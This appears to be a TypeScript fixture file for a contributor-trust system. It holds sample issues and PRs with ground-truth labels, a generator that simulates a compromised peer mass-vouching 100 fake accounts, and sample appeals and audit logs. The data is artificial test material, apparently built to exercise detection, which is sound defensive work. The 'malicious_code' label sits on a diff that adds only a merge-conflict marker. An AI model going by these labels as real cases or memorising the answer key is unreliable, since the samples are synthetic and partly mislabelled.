      id: 'iss-304',
      kind: 'issue',
      prNumber: 1494,
      projectId: 'acme-runtime',
      authorHandle: 'nadia_first_issue',
      accountAgeDays: 5,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:38:00.000Z',
      title: 'Windows path separator breaks plugin glob matching on Node 22',
      body: 'Steps to reproduce:\n1. Run `acme check` on Windows 11 with Node 22.10\n2. Expected: matches `src\\plugins\\*.ts`\n3. Actual: returns 0 files because backslash is escaped in `globToRegex`.',
      filesChanged: [],
      diffText: '(GitHub Issue — detailed reproduction steps)',
      groundTruth: 'genuine_newcomer',
    },
    {
      id: 'pr-109',
      kind: 'pr',
      prNumber: 1489,
      projectId: 'acme-runtime',
      authorHandle: 'slop_bot_91',
      accountAgeDays: 19,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:40:00.000Z',
      title: 'refactor: optimize internal module exports for better tree shaking',
      body: 'Refactored exports for cleaner bundle output.',
      filesChanged: ['src/index.ts'],
      diffText: `--- a/src/index.ts
+++ b/src/index.ts
@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 export * from './engine';`,
      groundTruth: 'malicious_code',
    },
    {
      id: 'pr-110',
      kind: 'pr',
      prNumber: 1490,
      projectId: 'acme-runtime',
      authorHandle: 'omar_first_pr',
      accountAgeDays: 9,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:50:00.000Z',
      title: 'fix(cli): return exit code 2 when unknown subcommand flag is passed',
      body: 'Observed exit code 0 when running with --bad-flag. Updated arg parser to exit with status 2.',
      filesChanged: ['src/cli/args.ts', 'src/cli/args.test.ts'],
      diffText: `--- a/src/cli/args.ts
+++ b/src/cli/args.ts
@@ -40,3 +40,6 @@ export function parseFlags(argv: string[]) {
+    if (flag.startsWith('--') && !KNOWN_FLAGS.has(flag)) {
+      throw new UnknownFlagError(flag, 2);
+    }
--- a/src/cli/args.test.ts
+++ b/src/cli/args.test.ts
@@ -22,2 +22,6 @@
+  it('throws UnknownFlagError with exit code 2', () => {
+    expect(() => parseFlags(['--bad-flag'])).toThrow(/exit code 2|UnknownFlagError/i);
+  });`,
      groundTruth: 'genuine_newcomer',
    },
  ];
}

/**
 * Generates a realistic "Trusted Peer Turns Rogue & Vouches 100 Fake Accounts" attack:
 * A previously trusted peer (`zig-stdx`) gets compromised and injects 100 fake accounts
 * into its VOUCHED.td within 30 minutes, and 5 of those fake accounts open incoming PRs.
 */
export function generateRogueMassVouchAttack(
  compromisedProjectId: string,
  targetProjectId: string,
  referenceNowIso: string
): { fakeVouches: VouchEntry[]; fakePrs: PullRequestEvent[] } {
  const nowMs = Date.parse(referenceNowIso);
  const fakeVouches: VouchEntry[] = [];
  const fakePrs: PullRequestEvent[] = [];

  for (let i = 1; i <= 100; i++) {
    const handle = `fake_acct_${String(1000 + i)}`;
    const ts = new Date(nowMs - (100 - i) * 15000).toISOString();
    fakeVouches.push({
      id: `rogue-vouch-${compromisedProjectId}-${i}-${nowMs}`,
      projectId: compromisedProjectId,
      contributorHandle: handle,
      status: 'vouched',
      reason: 'Bulk automated vouch',
      createdAt: ts,
    });
  }

  for (let i = 1; i <= 5; i++) {
    const handle = `fake_acct_${String(1000 + i)}`;
    fakePrs.push({
      id: `pr-rogue-fake-${i}-${nowMs}`,
      kind: 'pr',
      prNumber: 1600 + i,
      projectId: targetProjectId,
      authorHandle: handle,
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: new Date(nowMs - (5 - i) * 60000).toISOString(),
      title: `chore(deps): update internal helper configuration #${i}`,
      body: 'Automated maintenance PR from newly vouched contributor.',
      filesChanged: ['src/config/defaults.ts'],
      diffText: `--- a/src/config/defaults.ts
+++ b/src/config/defaults.ts
@@ -4,1 +4,2 @@
+// tuned timeout constant ${i}`,
      groundTruth: 'rogue_fake_account',
    });
  }

  return { fakeVouches, fakePrs };
}

export function createInitialAppeals(): AppealRecord[] {
  return [
    {
      id: 'apl-01',
      contributorHandle: 'hana_student',
      denouncedByProjectId: 'rogue-lint',
      denouncementReason: 'Closed issue without permission (petty dispute)',
      appealStatement:
        'I opened a valid bug reproduction on RogueLint and closed my own duplicate issue; the maintainer denounced my account in retaliation. My PRs on Acme Runtime include full unit tests.',
      evidenceUrl: 'https://github.com/acme-org/runtime/pull/1485',
      status: 'pending',
      createdAt: '2026-11-17T09:30:00.000Z',
    },
    {
      id: 'apl-02',
      contributorHandle: 'liam_os_dev',
      denouncedByProjectId: 'rogue-lint',
      denouncementReason: 'Disagreed on formatting rule',
      appealStatement:
        'Denounced over a style disagreement. I have 18 merged PRs across TypeScript ecosystem repositories with zero abuse reports.',
      evidenceUrl: 'https://github.com/vitejs/vite-plugin-kit/pulls?q=author%3Aliam_os_dev',
      status: 'pending',
      createdAt: '2026-11-17T14:15:00.000Z',
    },
  ];
}

export function createInitialAuditLog(): AuditLogEntry[] {
  return [
    {
      id: 'aud-1',
      timestamp: '2026-10-25T10:00:00.000Z',
      actor: 'ghostty',
      action: 'vouched_td_imported',
      target: 'ghostty/VOUCHED.td',
      details: 'Synchronized 7 vouched and 3 denounced entries from Ghostty public list.',
    },
    {
      id: 'aud-2',
      timestamp: '2026-11-16T15:25:00.000Z',
      actor: 'trust-engine',
      action: 'trust_edge_updated',
      target: 'rogue-lint',
      details: 'Detected high denounce-to-vouch ratio (19/21); applied automatic hostile-node damping (0.15x).',
    },
    {
      id: 'aud-3',
      timestamp: '2026-11-17T09:30:00.000Z',
      actor: 'hana_student',
      action: 'appeal_submitted',
      target: 'rogue-lint',
      details: 'Submitted appeal against unilateral denouncement with PR #1485 evidence.',
    },
  ];
}
